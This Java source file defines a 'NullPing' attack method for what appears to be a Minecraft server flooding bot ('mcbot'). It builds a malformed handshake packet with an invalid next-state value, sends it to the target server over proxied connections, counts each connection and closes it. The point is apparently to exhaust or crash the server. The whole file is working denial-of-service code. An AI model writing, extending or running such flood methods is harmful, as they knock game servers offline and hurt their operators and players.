package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import xyz.mcbot.Main;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;
import xyz.mcbot.minecraftutils.Handshake;

public class NullPing implements Method
{
  private Handshake handshake;
  private byte[] bytes;
  
  public NullPing()
  {
    handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 69);
    bytes = handshake.getWrappedPacket();
  }
  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException { while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }
    out.writeByte(paramInt);
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
    channel.close();
  }
}
